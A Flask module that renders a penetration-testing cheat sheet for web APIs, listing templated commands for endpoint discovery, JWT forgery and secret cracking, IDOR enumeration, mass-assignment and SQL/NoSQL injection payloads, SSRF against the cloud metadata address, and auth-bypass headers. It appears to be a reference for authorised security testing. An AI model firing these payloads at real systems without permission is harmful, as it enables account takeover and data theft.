from flask import Blueprint, render_template

bp = Blueprint("apitest", __name__)

CARDS = [
    {"title": "Discover endpoints", "hint": "$RHOST:$RPORT target API.", "blocks": [
        {"tpl": "ffuf -u http://$RHOST:$RPORT/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"},
        {"tpl": "ffuf -u http://$RHOST:$RPORT/api/v1/FUZZ -w $WORDLIST -mc all -fc 404"},
        {"tpl": "curl -s http://$RHOST:$RPORT/swagger.json | jq '.paths|keys'", "lbl": "swagger/openapi"},
        {"tpl": "curl -s http://$RHOST:$RPORT/openapi.json | jq .", "lbl": "openapi spec"},
        {"tpl": "curl -s http://$RHOST:$RPORT/api-docs", "lbl": "swagger UI / docs"},
        {"tpl": "curl -s http://$RHOST:$RPORT/robots.txt http://$RHOST:$RPORT/.well-known/", "plain": True},
    ]},
    {"title": "Enumerate methods & versions", "blocks": [
        {"tpl": "curl -sX OPTIONS http://$RHOST:$RPORT/api/v1/users -i", "lbl": "allowed methods"},
        {"tpl": "for v in v1 v2 v3; do curl -s -o /dev/null -w \"$v %{http_code}\\n\" http://$RHOST:$RPORT/api/$v/; done", "lbl": "version sprawl"},
        {"tpl": "curl -s http://$RHOST:$RPORT/api/v1/users -H 'Accept: application/json' | jq .", "plain": True},
    ]},
    {"title": "Authentication & tokens", "blocks": [
        {"tpl": "curl -s http://$RHOST:$RPORT/api/login -d '{\"user\":\"$USER\",\"pass\":\"$PASS\"}' -H 'Content-Type: application/json'"},
        {"tpl": "curl -s http://$RHOST:$RPORT/api/v1/me -H 'Authorization: Bearer <token>'"},
        {"tpl": "curl -s http://$RHOST:$RPORT/api/v1/me -H 'X-API-Key: <key>'"},
        {"tpl": "echo <jwt> | cut -d. -f2 | base64 -d 2>/dev/null | jq .", "lbl": "decode JWT claims"},
        {"tpl": "python3 jwt_tool.py <jwt> -X a", "lbl": "JWT alg:none / key confusion"},
        {"tpl": "hashcat -m 16500 jwt.txt $PASSLIST", "lbl": "crack HS256 secret"},
    ]},
    {"title": "BOLA / IDOR (object-level auth)", "hint": "The #1 API bug — swap IDs across users.", "blocks": [
        {"tpl": "curl -s http://$RHOST:$RPORT/api/v1/users/1 -H 'Authorization: Bearer <userB-token>'", "lbl": "read another user's object"},
        {"tpl": "for i in $(seq 1 100); do curl -s -o /dev/null -w \"%{http_code} $i\\n\" http://$RHOST:$RPORT/api/v1/orders/$i -H 'Authorization: Bearer <tok>'; done", "lbl": "enumerate IDs"},
        {"tpl": "# swap numeric/UUID id, method (GET->PUT/DELETE), and role fields", "plain": True},
    ]},
    {"title": "Mass assignment & injection", "blocks": [
        {"tpl": "curl -s http://$RHOST:$RPORT/api/v1/users -X POST -d '{\"user\":\"x\",\"role\":\"admin\",\"isAdmin\":true}' -H 'Content-Type: application/json'", "lbl": "mass assignment"},
        {"tpl": "sqlmap -u 'http://$RHOST:$RPORT/api/v1/item?id=1' --headers='Authorization: Bearer <tok>' --level 5", "lbl": "SQLi in API params"},
        {"tpl": "# also test NoSQLi: {\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}", "plain": True},
        {"tpl": "curl -s http://$RHOST:$RPORT/api/v1/import -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'", "lbl": "SSRF via url param"},
    ]},
    {"title": "GraphQL", "hint": "Often at /graphql or /api/graphql.", "blocks": [
        {"tpl": "curl -s http://$RHOST:$RPORT/graphql -d '{\"query\":\"{__schema{types{name}}}\"}' -H 'Content-Type: application/json'", "lbl": "introspection"},
        {"tpl": "python3 -m graphql_cop -t http://$RHOST:$RPORT/graphql", "lbl": "audit misconfigs"},
        {"tpl": "clairvoyance http://$RHOST:$RPORT/graphql -w $WORDLIST", "lbl": "recover schema when introspection off"},
        {"tpl": "# batching: send an array of queries to brute/bypass rate-limits", "plain": True},
    ]},
    {"title": "Rate-limit / auth bypass tricks", "blocks": [
        {"tpl": "-H 'X-Forwarded-For: 127.0.0.1'  -H 'X-Original-URL: /admin'", "plain": True},
        {"tpl": "add/remove trailing slash, .json, %00, ../; change Content-Type", "plain": True},
        {"tpl": "ffuf ... -H 'Authorization: Bearer FUZZ' -w tokens.txt", "lbl": "token brute"},
    ]},
    {"title": "Recon — crawl & param discovery", "hint": "Find endpoints & parameters before attacking.", "blocks": [
        {"tpl": "katana -u http://$RHOST:$RPORT -jc -kf all -d 5", "lbl": "crawl (JS-aware)"},
        {"tpl": "gau $RHOST | grep -E 'api|/v[0-9]|graphql'", "lbl": "historical URLs (getallurls)"},
        {"tpl": "waybackurls $RHOST | grep api", "lbl": "wayback URLs"},
        {"tpl": "arjun -u http://$RHOST:$RPORT/api/endpoint", "lbl": "hidden parameter discovery"},
        {"tpl": "kr scan http://$RHOST:$RPORT -w routes-large.kite -x 20", "lbl": "kiterunner — real API route brute"},
        {"tpl": "nuclei -u http://$RHOST:$RPORT -tags api,exposure,misconfig", "lbl": "templated checks"},
    ]},
    {"title": "GraphQL — recon tooling", "blocks": [
        {"tpl": "graphw00f -d -t http://$RHOST:$RPORT/graphql", "lbl": "fingerprint the engine"},
        {"tpl": "python3 -m inql -t http://$RHOST:$RPORT/graphql", "lbl": "InQL — schema + queries"},
        {"tpl": "clairvoyance http://$RHOST:$RPORT/graphql -w $WORDLIST -o schema.json", "lbl": "recover schema (introspection off)"},
    ]},
    {"title": "Tooling — where to get it (latest)", "hint": "Persistent repos / release URLs. Most are Go 'install' or pipx.", "blocks": [
        {"tpl": "go install github.com/projectdiscovery/katana/cmd/katana@latest", "lbl": "katana — github.com/projectdiscovery/katana"},
        {"tpl": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", "lbl": "nuclei — github.com/projectdiscovery/nuclei"},
        {"tpl": "go install github.com/lc/gau/v2/cmd/gau@latest", "lbl": "gau — github.com/lc/gau"},
        {"tpl": "go install github.com/assetnote/kiterunner/cmd/kr@latest", "lbl": "kiterunner — github.com/assetnote/kiterunner"},
        {"tpl": "wget https://github.com/assetnote/kiterunner/releases/latest/download/routes-large.kite.tar.gz", "lbl": "kiterunner routes wordlist"},
        {"tpl": "pipx install arjun", "lbl": "arjun — github.com/s0md3v/Arjun"},
        {"tpl": "git clone https://github.com/ticarpi/jwt_tool", "lbl": "jwt_tool — github.com/ticarpi/jwt_tool"},
        {"tpl": "pipx install graphql-cop", "lbl": "graphql-cop — github.com/dolevf/graphql-cop"},
        {"tpl": "git clone https://github.com/dolevf/graphw00f", "lbl": "graphw00f — github.com/dolevf/graphw00f"},
        {"tpl": "pipx install clairvoyance", "lbl": "clairvoyance — github.com/nikitastupin/clairvoyance"},
        {"tpl": "git clone https://github.com/doyensec/inql", "lbl": "InQL — github.com/doyensec/inql"},
    ]},
]


@bp.route("/api")
def index():
    return render_template("cheat.html", active="apitest",
                           title="API", tag="exploitation",
                           intro="API recon + exploitation: crawl/param-discover, break auth/JWT, hunt BOLA/IDOR and mass-assignment, dump GraphQL. Tooling repos at the bottom.",
                           cards=CARDS)


MODULE = {"id": "apitest", "title": "API", "category": "Exploitation",
          "order": 3, "blueprint": bp, "endpoint": "apitest.index"}
